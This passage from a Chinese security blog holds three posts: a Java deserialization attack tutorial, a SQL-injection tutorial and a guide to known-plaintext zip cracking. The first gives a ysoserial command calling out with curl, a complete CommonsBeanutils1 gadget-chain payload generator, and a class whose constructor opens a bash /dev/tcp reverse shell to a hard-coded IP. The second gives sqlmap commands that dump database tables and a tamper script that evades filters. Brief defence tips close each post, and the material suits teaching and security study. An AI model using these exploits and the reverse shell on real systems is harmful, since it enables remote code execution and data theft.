@gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure>

<p>比如如果已知目标程序依赖了<code>CommonsBeanutils1</code>对应的依赖<code>commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</code>，<br>则可以：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 'curl 172.20.26.42:8081' | base64</span><br></pre></td></tr></table></figure>
<p>生成执行base64的payload。</p>
<h2 id="手动构造"><a href="#手动构造" class="headerlink" title="手动构造"></a>手动构造</h2><p>可以参考：<a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>
<p>手动构造需要写代码，比较繁琐。所以我们以简化的情景来假设。<br>假设我们直接有了目标程序的jar包，则可以解压得到依赖库(lib目录)，然后新建一个Java项目，把依赖jar包全导入进去。<br>假设目标程序依赖了<code>commons-beanutils-1.9.2</code>，我们从mvn核心库可以看到它存在CVE:<br><a href="https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2</a></p>
<img src="/images/2022-10/cve.png" class="" width="800" height="1200" title="cve">

<p>mvn中央仓库专门有一列<code>Vulnerabilities</code>来标示存在<code>vulnerability</code>(弱点、漏洞)的库版本。<br>(类似于sqlmap中提示某字段是vulnerable的)</p>
<blockquote>
<p>CVE(Common Vulnerabilities &amp; Exposures): 漏洞编号，大家约定的、这个漏洞的名字；<br>PoC(Proof of concept): （概念验证）漏洞证明<br>vul(Vulnerability): 泛指漏洞<br>exp: 漏洞利用，一般是个demo程序</p>
</blockquote>
<p>根据参考资料，我们可以用<code>BeanComparator</code>来构造一个反序列化的攻击。<br>创建一个优先队列，把<code>Comparator</code>设置成<code>BeanComparator</code>，然后塞进2个元素，再强行通过反射换掉元素。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.comparator.BooleanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printPayload</span><span class="params">(<span class="keyword">byte</span>[] clazzBytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, BooleanComparator.TRUE_HIGH);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="keyword">false</span>);</span><br><span class="line">        queue.add(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[] &#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        write(queue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="string">"base64:"</span>);</span><br><span class="line">        String base64Str = <span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line">        System.out.println(base64Str);</span><br><span class="line">        System.out.println(<span class="string">"base64 end"</span>);</span><br><span class="line"></span><br><span class="line">        tryDecode(base64Str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tryDecode</span><span class="params">(String base64Str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] res = Base64.getDecoder().decode(base64Str.getBytes());</span><br><span class="line">        InputStream in = <span class="keyword">new</span> ByteArrayInputStream(res);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(HelloTemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        printPayload(clazz.toBytecode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上所示我们就可以注入任意想要执行的代码(<code>HelloTemplatesImpl</code>)了。</p>
<p>譬如我们可以在它的构造函数里放入想要执行的恶意代码(反向shell):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Process p;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = r.exec(<span class="keyword">new</span> String[] &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>,</span><br><span class="line">                    <span class="string">"exec 5&lt;&gt;/dev/tcp/172.29.53.149/5279;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"End TemplatesImpl"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h1><p>1。对于依赖的库，定期在mvn中心仓库检查<code>Vulnerabilities</code>列，如果有CVE，尽量及早升级到安全版本；<br>2。尽量不反序列化生成对象；<br>3。不要信任用户输入；</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a><br><a href="https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsBeanutils1Shiro.java" target="_blank" rel="noopener">https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsBeanutils1Shiro.java</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/" data-id="cl8zaqgfs0000z9am8327a4ri" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/sql注入攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2022-09-27T10:55:35.000Z" itemprop="datePublished">2022-09-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">sql注入攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="WHAT-sql注入是什么"><a href="#WHAT-sql注入是什么" class="headerlink" title="WHAT: sql注入是什么"></a>WHAT: sql注入是什么</h1><p>在输入的字符串之中注入SQL指令。<br>如果代码中是以拼接用户输入成一个sql交给数据库执行的话，就很容易被此类攻击攻破。</p>
<h1 id="HOW-sql注入如何发生"><a href="#HOW-sql注入如何发生" class="headerlink" title="HOW: sql注入如何发生"></a>HOW: sql注入如何发生</h1><p>假如代码中的拼接逻辑:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = <span class="string">"SELECT * FROM users WHERE (name = '"</span> + userName + <span class="string">"') and (pw = '"</span>+ passWord +<span class="string">"');"</span></span><br></pre></td></tr></table></figure>
<p>然后用户输入:<code>userName = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;</code><br>则拼接后的结果:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure>
<p>则sql实际逻辑发生了变化，执行了用户注入的逻辑。<br>攻击方不一定需要从回显中获取信息，只需要通过sleep函数即可通过时间差进行盲注。<br>大致攻击逻辑：<br>1。通过拼接sleep判断是否存在被注入点；<br>2。通过拼接逻辑运算+sleep判断（逻辑短路）判断某个条件是否成立；<br>（比如 某个表是否存在、表名的每一位字母是否正确来慢慢试探出表名）</p>
<h1 id="sqlmap工具"><a href="#sqlmap工具" class="headerlink" title="sqlmap工具"></a>sqlmap工具</h1><p>首先正常请求一次目标，然后将request header和payload保存到<code>1.txt</code>中，然后就可以用sqlmap来进行盲注了。</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 首先探测有哪些数据库:</span></span><br><span class="line">sqlmap -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 探测有哪些表:</span></span><br><span class="line">sqlmap -r 1.txt --level 3 --risk 3 -D 上一步的db --tables</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 打印指定easysql库下flag表的数据:</span></span><br><span class="line">sqlmap -r 1.txt --level 5 --risk 3 -D easysql -T flag --dump</span><br></pre></td></tr></table></figure>
<p>有时候会遇到目标服务器有一些简单的字符串过滤、拦截的逻辑，可以通过加tamper的方式绕过:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt  --tamper "easysql.py" --level 5 --risk 3 -D easysql --tables</span><br></pre></td></tr></table></figure>
<p>tamper有到的文件位于:<br><code>/Library/Python/3.7/site-packages/sqlmap/tamper/</code>目录下，可以通过<code>locate space2comment.py</code>来寻找对应目录。</p>
<p>打印指定列:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 2.txt -D ctf -T user -C "username,password" <span class="comment">--dump -D easysql --tables</span></span><br></pre></td></tr></table></figure>

<h2 id="自己编写tamper"><a href="#自己编写tamper" class="headerlink" title="自己编写tamper"></a>自己编写tamper</h2><p>主要是实现一个<code>def tamper(payload, **kwargs)</code>方法:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">'union'</span> , <span class="string">'uniunionon'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'select'</span> , <span class="string">'selselectect'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'where'</span> , <span class="string">'whewherere '</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'or'</span> , <span class="string">'oorr'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'ro'</span> , <span class="string">'rroo'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">'flag'</span> , <span class="string">'flflagag'</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">"'"</span> , <span class="string">'"'</span>)</span><br><span class="line">    <span class="comment"># payload= payload.replace('from' , 'frfromom')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('information' , 'infoorrmation')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('and' , 'anandd')</span></span><br><span class="line">    <span class="comment"># payload= payload.replace('by' , 'bbyy')</span></span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>1。用模版sql功能，不要自己手拼用户输入到sql;<br>2。校验用户输入；<br>3。限制用户请求频率，控制返回的时间稳定，不要让用户感知到时间差。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://copyfuture.com/blogs-details/20211205073411933f" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20211205073411933f</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" data-id="cl8k2l2oz0000xqamban68yds" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/已知明文破解zip" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/" class="article-date">
  <time datetime="2022-09-26T07:40:47.000Z" itemprop="datePublished">2022-09-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/26/2022-09/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E7%A0%B4%E8%A7%A3zip/">已知明文破解zip</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="已知明文攻击"><a href="#已知明文攻击" class="headerlink" title="已知明文攻击"></a>已知明文攻击</h1><p>当我们拿到一个用密码加密的zip文件的时候，如果我们恰好还知道压缩包里某个文件的明文，就可以使用pkcrack进行已知明文破解zip。<br>比如我们的目标是：<code>密文.zip</code>,<br>我们可以直接vi一下这个zip文件可以看到它里面到底有哪些文件。（即使是加密的也可以看到里面有什么文件）<br>比如这个压缩包里恰好有一个<code>明文.png</code>，（有些人喜欢在所有压缩包里放版权声明文件或者广告图，这样根据文件名在网上可以直接搜到明文文件）<br>我们可以把这个<code>明文.png</code>手动压缩一下得到<code>明文.zip</code>。<br>然后开始安装<code>pkcrack</code>然后破解。</p>
<p>mac下可以用brew安装一个pkcrack:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pkcrack</span><br></pre></td></tr></table></figure>

<p>或者直接下载一个<code>pkcrack-1.2.2</code>：<br><a href="http://www.password-crackers.com/en/category_98/program_24.html" target="_blank" rel="noopener">http://www.password-crackers.com/en/category_98/program_24.html</a><br>下载以后在src里make一下就能得到可执行文件了。<br>然后就简单了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">[user@ip pkcrack-1.2.2]# .&#x2F;src&#x2F;pkcrack  -C 密文.zip -c 明文.png -P 明文.zip -p 明文.png -d 结果.zip -a</span><br><span class="line">Files read. Starting stage 1 on Mon Sep 26 15:40:09 2022</span><br><span class="line">Generating 1st generation of possible key2_822346 values...done.</span><br><span class="line">Found 4194304 possible key2-values.</span><br><span class="line">Now we&#39;re trying to reduce these...</span><br><span class="line">Lowest number: 947 values at offset 818742</span><br><span class="line">Lowest number: 901 values at offset 818736</span><br><span class="line">Lowest number: 872 values at offset 818720</span><br><span class="line">Lowest number: 847 values at offset 818719</span><br><span class="line">Lowest number: 838 values at offset 818625</span><br><span class="line">Lowest number: 804 values at offset 818589</span><br><span class="line">Lowest number: 745 values at offset 818571</span><br><span class="line">Lowest number: 711 values at offset 818569</span><br><span class="line">Lowest number: 677 values at offset 818366</span><br><span class="line">Lowest number: 657 values at offset 818337</span><br><span class="line">Lowest number: 656 values at offset 818294</span><br><span class="line">Lowest number: 642 values at offset 818292</span><br><span class="line">Lowest number: 589 values at offset 817979</span><br><span class="line">Lowest number: 572 values at offset 817970</span><br><span class="line">Lowest number: 568 values at offset 817966</span><br><span class="line">Lowest number: 564 values at offset 817936</span><br><span class="line">Lowest number: 537 values at offset 817934</span><br><span class="line">Lowest number: 533 values at offset 817907</span><br><span class="line">Lowest number: 530 values at offset 817896</span><br><span class="line">Lowest number: 436 values at offset 817874</span><br><span class="line">Lowest number: 398 values at offset 817862</span><br><span class="line">Lowest number: 394 values at offset 817833</span><br><span class="line">Lowest number: 353 values at offset 817830</span><br><span class="line">Lowest number: 351 values at offset 817789</span><br><span class="line">Lowest number: 328 values at offset 817787</span><br><span class="line">Lowest number: 322 values at 